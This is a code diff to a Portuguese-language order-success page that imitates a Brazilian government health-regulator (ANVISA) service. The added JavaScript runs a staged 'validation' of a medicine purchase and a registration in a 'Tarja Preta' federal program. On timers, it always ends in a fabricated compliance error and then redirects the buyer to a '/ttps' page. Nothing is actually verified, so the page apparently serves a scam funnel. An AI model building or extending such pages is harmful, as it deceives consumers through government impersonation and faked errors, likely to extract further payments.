@@ -320,6 +320,124 @@
       font-weight: 600;
       color: #1f2937;
     }
+    
+    /* Estilos para o loader de validação */
+    .validation-loader {
+      background-color: #f0f7ff;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      border: 1px solid #bfdbfe;
+      text-align: left;
+    }
+    
+    .validation-loader-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .validation-loader-title i {
+      margin-right: 8px;
+      color: #1351b4;
+    }
+    
+    .validation-step {
+      display: flex;
+      align-items: flex-start;
+      margin-bottom: 16px;
+      padding-bottom: 16px;
+      border-bottom: 1px dashed #bfdbfe;
+    }
+    
+    .validation-step:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+    }
+    
+    .validation-step-icon {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .validation-step-content {
+      flex-grow: 1;
+    }
+    
+    .validation-step-title {
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+    
+    .validation-step-description {
+      font-size: 14px;
+      color: #4b5563;
+    }
+    
+    .step-pending .validation-step-icon {
+      background-color: #e5e7eb;
+      color: #6b7280;
+    }
+    
+    .step-pending .validation-step-title {
+      color: #6b7280;
+    }
+    
+    .step-processing .validation-step-icon {
+      background-color: #dbeafe;
+      color: #1e40af;
+    }
+    
+    .step-processing .validation-step-title {
+      color: #1e40af;
+    }
+    
+    .step-completed .validation-step-icon {
+      background-color: #dcfce7;
+      color: #16a34a;
+    }
+    
+    .step-completed .validation-step-title {
+      color: #16a34a;
+    }
+    
+    .step-error .validation-step-icon {
+      background-color: #fee2e2;
+      color: #b91c1c;
+    }
+    
+    .step-error .validation-step-title {
+      color: #b91c1c;
+    }
+    
+    .loader {
+      border: 2px solid rgba(0, 0, 0, 0.1);
+      border-radius: 50%;
+      border-top: 2px solid #1351b4;
+      width: 16px;
+      height: 16px;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    .hidden-section {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -384,7 +502,55 @@
         <h2 class="success-title">Pedido Realizado com Sucesso!</h2>
         <p class="success-subtitle">Obrigado pela sua aquisição. Seu pedido foi recebido e está sendo processado.</p>
         
-        <div class="order-details">
+        <!-- Loader de validação -->
+        <div class="validation-loader">
+          <h3 class="validation-loader-title">
+            <i class="fas fa-cogs"></i> Processamento do Pedido
+          </h3>
+          
+          <div class="validation-step step-completed" id="step1">
+            <div class="validation-step-icon">
+              <i class="fas fa-check"></i>
+            </div>
+            <div class="validation-step-content">
+              <h4 class="validation-step-title">Validação do Pagamento</h4>
+              <p class="validation-step-description">Confirmando o processamento do pagamento para o envio do medicamento.</p>
+            </div>
+          </div>
+          
+          <div class="validation-step step-pending" id="step2">
+            <div class="validation-step-icon">
+              <div class="loader"></div>
+            </div>
+            <div class="validation-step-content">
+              <h4 class="validation-step-title">Vinculação de Medicamentos</h4>
+              <p class="validation-step-description">Associando os medicamentos adquiridos ao perfil do usuário para monitoramento de comercialização.</p>
+            </div>
+          </div>
+          
+          <div class="validation-step step-pending" id="step3">
+            <div class="validation-step-icon">
+              <i class="fas fa-clock"></i>
+            </div>
+            <div class="validation-step-content">
+              <h4 class="validation-step-title">Registro na Base Governamental</h4>
+              <p class="validation-step-description">Iniciando o cadastro do usuário no programa federal de pacientes Tarja Preta.</p>
+            </div>
+          </div>
+          
+          <div class="validation-step step-pending" id="step4">
+            <div class="validation-step-icon">
+              <i class="fas fa-clock"></i>
+            </div>
+            <div class="validation-step-content">
+              <h4 class="validation-step-title">Verificação de Conformidade</h4>
+              <p class="validation-step-description">Validando o cadastro no programa Tarja Preta.</p>
+            </div>
+          </div>
+        </div>
+        
+        <!-- Detalhes do pedido (inicialmente oculto) -->
+        <div class="order-details" id="orderDetailsSection">
           <h3 class="order-title">Detalhes do Pedido</h3>
           
           <div class="order-info">
@@ -428,7 +594,7 @@
           </div>
         </div>
         
-        <div class="delivery-estimate">
+        <div class="delivery-estimate hidden-section" id="deliverySection">
           <h4 class="estimate-title">
             <i class="fas fa-truck"></i> Estimativa de Entrega
           </h4>
@@ -441,7 +607,7 @@
           </div>
         </div>
         
-        <div class="next-steps">
+        <div class="next-steps hidden-section" id="nextStepsSection">
           <h3 class="next-steps-title">Próximos Passos</h3>
           
           <div class="steps-list">
@@ -530,6 +696,132 @@
   <a href="#" class="vlibras-icon">
     <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
   </a>
+  
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Preencher dados do cliente
+      const clientNameElement = document.getElementById('clientName');
+      const clientCpfElement = document.getElementById('clientCpf');
+      const orderNumberElement = document.getElementById('orderNumber');
+      const orderDateElement = document.getElementById('orderDate');
+      
+      // Atualizar dados do cliente (obter da sessão ou gerar aleatório)
+      if (clientNameElement) {
+        const storedName = sessionStorage.getItem('client_name') || localStorage.getItem('client_name');
+        clientNameElement.textContent = storedName || 'Cliente ANVISA';
+      }
+      
+      if (clientCpfElement) {
+        const storedCpf = sessionStorage.getItem('client_cpf') || localStorage.getItem('client_cpf');
+        clientCpfElement.textContent = storedCpf || '123.456.789-00';
+      }
+      
+      // Gerar número de pedido aleatório se não existir
+      if (orderNumberElement && orderNumberElement.textContent === 'BRA25044789') {
+        const prefix = "BRA";
+        const year = "25";
+        const randomNum = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+        orderNumberElement.textContent = prefix + year + randomNum;
+      }
+      
+      // Atualizar data do pedido para a data atual
+      if (orderDateElement) {
+        const today = new Date();
+        const formattedDate = today.toLocaleDateString('pt-BR');
+        orderDateElement.textContent = formattedDate;
+      }
+      
+      // Sequência de etapas de validação
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      const step3 = document.getElementById('step3');
+      const step4 = document.getElementById('step4');
+      
+      // Seções para mostrar/ocultar
+      const orderDetailsSection = document.getElementById('orderDetailsSection');
+      const deliverySection = document.getElementById('deliverySection');
+      const nextStepsSection = document.getElementById('nextStepsSection');
+      
+      // Inicialmente, ocultar seções de detalhes
+      if (orderDetailsSection) orderDetailsSection.classList.add('hidden-section');
+      if (deliverySection) deliverySection.classList.add('hidden-section');
+      if (nextStepsSection) nextStepsSection.classList.add('hidden-section');
+      
+      // Enviar evento de compra
+      // Na implementação real, isso seria feito via AJAX para registrar o evento no servidor
+      console.log("Registrando evento de compra");
+      
+      // Função para atualizar as etapas de validação
+      const updateValidationStep = (step, status, description = null) => {
+        if (!step) return;
+        
+        // Remover classes anteriores
+        step.classList.remove('step-pending', 'step-processing', 'step-completed', 'step-error');
+        
+        // Adicionar nova classe com base no status
+        step.classList.add(`step-${status}`);
+        
+        // Atualizar o ícone
+        const iconElement = step.querySelector('.validation-step-icon');
+        if (iconElement) {
+          iconElement.innerHTML = '';
+          
+          if (status === 'pending') {
+            iconElement.innerHTML = '<i class="fas fa-clock"></i>';
+          } else if (status === 'processing') {
+            iconElement.innerHTML = '<div class="loader"></div>';
+          } else if (status === 'completed') {
+            iconElement.innerHTML = '<i class="fas fa-check"></i>';
+          } else if (status === 'error') {
+            iconElement.innerHTML = '<i class="fas fa-times"></i>';
+          }
+        }
+        
+        // Atualizar a descrição, se fornecida
+        if (description) {
+          const descriptionElement = step.querySelector('.validation-step-description');
+          if (descriptionElement) {
+            descriptionElement.textContent = description;
+          }
+        }
+      };
+      
+      // Iniciar a sequência de validação
+      setTimeout(() => {
+        // Etapa 1 já está completa
+        
+        // Etapa 2: Vincular medicamentos
+        updateValidationStep(step2, 'processing');
+        
+        setTimeout(() => {
+          // Completar etapa 2
+          updateValidationStep(step2, 'completed');
+          
+          // Etapa 3: Iniciar cadastro
+          updateValidationStep(step3, 'processing');
+          
+          setTimeout(() => {
+            // Completar etapa 3
+            updateValidationStep(step3, 'completed');
+            
+            // Etapa 4: Verificação de conformidade (com erro)
+            updateValidationStep(step4, 'processing');
+            
+            setTimeout(() => {
+              // Mostrar erro na etapa 4
+              updateValidationStep(step4, 'error', 'Validando o cadastro no programa Tarja Preta. Erro: Os dados fornecidos não cumprem os requisitos do programa.');
+              
+              // Aguardar 3 segundos e redirecionar para a página de TTPS
+              setTimeout(() => {
+                window.location.href = '/ttps';
+              }, 3000);
+              
+            }, 2000);
+          }, 2000);
+        }, 2000);
+      }, 1000);
+    });
+  </script>
   
   <script>
     // Gerar número de pedido aleatório
